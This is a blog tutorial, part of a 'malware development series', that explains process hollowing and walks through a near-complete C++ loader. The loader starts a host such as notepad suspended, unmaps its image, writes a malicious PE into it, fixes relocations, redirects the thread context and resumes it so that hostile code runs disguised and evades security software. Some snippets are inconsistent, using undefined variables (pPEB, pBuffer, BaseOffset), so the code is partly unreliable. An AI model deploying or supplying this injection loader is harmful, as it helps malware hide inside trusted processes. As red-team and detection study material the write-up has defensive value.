---
title: 'Malwares Development Series | Part 3 : Process Injection | Process Hollowing'
published: 2024-07-29
description: ''
image: ''
tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
category: 'Malwares'
draft: false 
---

Hello, as a continuaton on our walkthrough about malwares techniques, Today we will cover the Process Hollowing technique.
During this blog, we'll follow this plan :

- **What is Process Hollowing ?**
- **How Process Hollowing works ?**
- **Process Hollowing Implementation**

Note : This Technique requires a deep understanding to Windows Process Mechanisms like PEB and MEMORY stuffs, So i recommende you to go take a look on them.

So let's begin

## What is Process Hollowing

First, we need to clarify the term "Hollowing", "Hollowed out" in the context of process hollowing refers to the act of removing or unmapping the legitimate code from a process's memory space and replacing it with malicious code.

So we can say that Process hollowing is a technique used to inject malicious code into a legitimate process. The process is essentially "hollowed out" and replaced with malicious code, which then runs under the guise of the legitimate process. Guess what, This technique is often used to evade detection by security software because the malicious code is running within a process that appears legitimate. Interesting huh ?

## How Process Hollowing works ?

The Process Hollowing operates on six important steps which are :

- **Create a Suspended Process**

First, we create a new instance of a legitimate process (e.g., notepad.exe) in a suspended state using CreateProcess with the CREATE_SUSPENDED flag. This means the process is created but not yet executed.

- **Unmap the Process's Memory**

Then, we use ZwUnmapViewOfSection or a similar API call to unmap the memory of the main executable image of the suspended process. This effectively "hollows out" the process.

- **Allocate Memory in the Process**
    
Allocates memory within the hollowed-out process using VirtualAllocEx.

- **Write Malicious Code to the Process**

We write the malicious code or the new executable image into the allocated memory of the suspended process using WriteProcessMemory.

- **Adjust Base Adresses ( The hard part )**

The purpose of this process is to ensure that all addresses within the loaded image are correctly adjusted to reflect the new base address in memory. This is necessary because the image may not always be loaded at its preferred base address, requiring relocation to function correctly.

- **Set Entry Point**
    
We modifie the entry point of the suspended process to point to the malicious code. This can be done by modifying the PEB (Process Environment Block) structure or by changing the CONTEXT of the process.

- **Resume the Process**
    
Finally, we need to resume the suspended process using ResumeThread. The process starts executing the malicious code instead of the original legitimate code.

## C++ Implamentation

Starting with importing the necessary libraries and Typedefs :
```cpp
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
```
We will see what are these Typdefs, don't worry.

### Suspended Process Creation

So as we said we should create a new instance of a legitimate process ( Notepade ) in a suspended state, why, because we should unmap its original code and replace it with our malicious one before the execution of its main thread.

So i'm gonna implement this inside a main function.
```cpp
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: Process Hollowing.exe [Host.exe] [Inject]\n");
        return 0;
    }
    LPSTARTUPINFOA pStartupinfo = new STARTUPINFOA();
    PROCESS_INFORMATION proc_info;

    printf("Creating Suspended Process. [%s]\n", argv[1]);
    CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pStartupinfo, &proc_info);
}
```
First, I check for the correct number of arguments: the host process executable and the malicious executable.
So as you can see there is two new structures that I used, STARTUPINFOA and PROCESS_INFORMATION, which are two crucial structures that provide information about the startup configuration and state of the new process and its primary thread.

You can find more a about them in Windows APIs documentation here [STARTUPINFOA]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa') and here [PROCESS_INFORMATION]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information')

### Mapping the malicious file to memory.

So after creating the suspended process, let's Map our malicious file.

```cpp
    HANDLE HEvilFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD EvilFileSize = GetFileSize(HEvilFile, NULL);
    PBYTE EvilImage = new BYTE[EvilFileSize];

    printf("Mapping File To Memory. [%s]\n", argv[2]);
    DWORD readbytes;
    ReadFile(HEvilFile, EvilImage, EvilFileSize, &readbytes, NULL);

```
So the malicious file specified by the second command-line argument ```argv[2]``` is opened for reading using the ```CreateFileA()``` function, with the ```GENERIC_READ``` flag allowing read access and ```FILE_SHARE_READ``` permitting shared read access by other processes. The ```OPEN_EXISTING``` flag just ensures the file must already exist, it is possible to not setting it if we want to create the malicious process during executing the code. 

Now The handle to this file is stored in ```HEvilFile```and we can grap The size of the malicious file which is then determined using GetFileSize, which returns the size in bytes. After that a EvilImage buffer is allocated in memory to hold the contents of the malicious file, with its size matching the file size. Then we use the ReadFile() function to read the file into this EvilImage buffer, which reads the entire file into memory and stores the number of bytes read in the readbytes variable. 

So after reading the file, 

### Getting the Current Context
Of course you are wondering what is this Context or Thread Context, lets take an overview on it. A thread context is a structure that contains the register values and other state information of a thread. It is crucial for operations such as debugging, thread manipulation, and our today's technique ```process hollowing```. The context includes the ```instruction pointer```, ```stack pointer```, and other registers that define the current state of the CPU as it executes the thread. So by manipulating the context, a program can control the execution flow of a thread, which is essential for techniques like process hollowing, where the goal is to replace the code of a legitimate process with malicious code while maintaining the execution context.

So lets see it on the code.
```
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(proc_info.hThread, pContext)) {
        printf("Error getting context\n");
        return 0;
    }
```
Here, a new CONTEXT structure is allocated on the heap. LPCONTEXT is a pointer to a CONTEXT structure which we'll use this to hold the register values and other state information of the thread.
The ContextFlags member of the CONTEXT structure is set to CONTEXT_FULL. This indicates that all parts of the thread's context should be retrieved, including the control registers, integer registers, and floating-point registers.

### Getting the Base Address of the Suspended Process

```
    PVOID BaseAddress;

    #ifdef _X86_ 
        ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
    #endif

    #ifdef _WIN64
        ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
    #endif
```
### Unmapping Sections
```
    printf("Unmapping Section.\n");
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
        printf("Error Unmapping Section\n");
        return 0;
    }
```
### Allocate and write malicious code

As usual, to allocate memory in the target process we use VirtualAllocEx(), so to understand the Writing of the code in the allocated memory, you should know about the structure of a PE file ( Portable Executable ). A Portable Executable (PE) file is a file format used in Windows operating systems for executables, object code, and DLLs (Dynamic Link Libraries). The format is designed so that the operating system can load and manage these files efficiently. 

This is easy right ?

let's cover some of its componants :

- **DOS Header** : This one contains a magic number (MZ) and a pointer to the NT Headers.
- **NT Headers** : Main header for the PE file, including the File Header and Optional Header.
- **Section Headers** : This one describe each section of the executable (e.g., code, data, resources).
- **Data Directories** : Pointers to other important tables and data structures, like the export, import, and relocation tables. We will see what are these things in other blogs. and we will foncus only on relocation and sections.

Here are some common Sections in PE Files.

| Section  | Purpose                                                                                 | Attributes          |
|----------|-----------------------------------------------------------------------------------------|---------------------|
| `.text`  | Contains the executable code.                                                           | Read-only, Executable |
| `.data`  | Contains initialized global and static variables.                                       | Read-write          |
| `.bss`   | Contains uninitialized global and static variables.                                     | Read-write          |
| `.rdata` | Contains read-only initialized data, such as string literals and constants.             | Read-only           |
| `.rsrc`  | Contains resource data, such as icons, menus, and dialogs.                              | Read-only           |
| `.edata` | Contains export data, including function names and addresses exported by the executable or DLL. | Read-only           |
| `.idata` | Contains import data, including names and addresses of functions and variables imported from other executables or DLLs. | Read-only           |
| `.reloc` | Contains relocation data used by the loader to adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. | Read-only           |
| `.pdata` | Contains exception handling data.                                                       | Read-only           |
| `.tls`   | Contains data for thread-local storage.                                                 | Read-write          |
| `.debug` | Contains debugging information.  

So i encourage you to do your homeworks about these stuffs, now let's break down the code.

```cpp
    PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)EvilImage;
    PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)EvilImage + dos_head->e_lfanew);

    PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
```
First, as we said before, we allocate space to contain our malicious code in the unmapped memory. we grap the size of the code to allocate from the code PE header using ``` pSourceHeaders->OptionalHeader.SizeOfImage ```.

After that, we start to write our code PE headers and sections on the allocated memory using WriteProcessMemory(), taking as parameters the pbuffer ( holds our code ) and the base adress to where it should start writing.

Starting by writing the PE headers, this part in the code explains itself by taking just the size of headers from the buffer and starting to write these headers from the adress which is the image base adress taken from the PEB  ```pPEB->ImageBaseAddress```.

```cpp
if (!WriteProcessMemory(
        pProcessInfo->hProcess,                 
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");
        return;
    }
```
Retrieves the DOS and NT headers from the mapped malicious file.
Allocates memory in the suspended process for the malicious image
```
    if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
        printf("Failed to write Headers\n");
        return 0;
    }

    PIMAGE_SECTION_HEADER sec_head;
    printf("Writing Sections:\n");
    for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
        sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        printf("0x%lx -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
        if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)EvilImage + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
            printf("Error Writing section: %s. At: %x%llp\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
        }
    }
```
### Adjust Base Adresses ( relocating : The hard part for me )

It seems like we are done !!! but no, we should adjust the base addresses of the code and data if the executable is not loaded at its preferred base address. 
The way to do this is by reconfiguring the relocation in .reloc section, dont worry if you didn't understand this, i'll make it easier, so let's get some information about .reloc section.

The .reloc section in a part of PE file contains relocation information used by the windows loader when the executable is loaded into memory. This section is crucial when the executable is not loaded at its preferred base address, requiring adjustments to certain memory addresses within the code and data.

For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes into play.


```cpp
        if (BaseOffset) {
        printf("\nRelocating The Relocation Table...\n");
        for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
            sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
            char pSectionName[] = ".reloc";
            if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
                continue;
            }

            DWORD RelocAddress = sec_head->PointerToRawData;
            IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            DWORD Offset = 0;

            while (Offset < RelocData.Size) {
                PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&EvilImage[RelocAddress + Offset];
                printf("\nRelocation Block 0x%x. Size: 0x%x\n", pBlockHeader->PageAddress, pBlockHeader->BlockSize);
                Offset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                printf("%d Entries Must Be Relocated In The Current Block.\n", EntryCount);

                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&EvilImage[RelocAddress + Offset];

                for (int x = 0; x < EntryCount; x++) {
                    Offset += sizeof(BASE_RELOCATION_ENTRY);
                    if (pBlocks[x].Type == 0) {
                        printf("The Type Of Base Relocation Is 0. Skipping.\n");
                        continue;
                    }

                    DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;

                    #ifdef _X86_
                    DWORD EntryAddress = 0;
                    ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0);
                    printf("0x%llx --> 0x%llx | At:0x%llx\n", EntryAddress, EntryAddress + BaseOffset, (PVOID)((DWORD)BaseAddress + FieldAddress));
                    EntryAddress += BaseOffset;
                    if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0)) {
                        printf("Error Writing Entry.\n");
                    }
                    #endif
                    #ifdef _WIN64
                    DWORD64 EntryAddress = 0;
                    ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0);
                    printf("0x%llx --> 0x%llx | At:0x%llx\n", EntryAddress, EntryAddress + BaseOffset, (PVOID)((DWORD64)BaseAddress + FieldAddress));
                    EntryAddress += BaseOffset;
                    if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EntryAddress, sizeof(PVOID), 0)) {
                        printf("Error Writing Entry.\n");
                    }
                    #endif
                }
            }
        }
    }

```
### Updating Context and Resuming the Process

```
    #ifdef _X86_
    pContext->Eax = (DWORD)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
    #endif
    #ifdef _WIN64
    pContext->Rcx = (DWORD64)BaseAddress + nt_head->OptionalHeader.AddressOfEntryPoint;
    #endif

    printf("Resuming Process\n");
    if (!SetThreadContext(proc_info.hThread, pContext)) {
        printf("Error Setting Thread Context\n");
    }

    if (!ResumeThread(proc_info.hThread)) {
        printf("Error Resuming Thread\n");
    }
}
```
